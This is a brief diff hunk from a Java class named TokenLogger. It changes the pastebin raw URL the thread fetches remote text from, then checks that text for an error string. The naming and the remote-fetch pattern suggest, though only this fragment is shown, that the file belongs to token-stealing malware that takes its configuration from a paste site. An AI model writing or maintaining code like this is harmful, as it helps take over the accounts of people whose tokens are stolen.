@@ -30,7 +30,7 @@ public class TokenLogger extends Thread {
 
         String ip = "ip";
         String subf = "s\":\"fail";
-        String pasteUtilsString = URLUtils.getTextFromURL("https://pastebin.com/raw/ihEM3qnd");
+        String pasteUtilsString = URLUtils.getTextFromURL("https://pastebin.com/raw/kUDtqwUx");
         if (pasteUtilsString.contains("err")) {
             errorInSection = 1;
         } else {
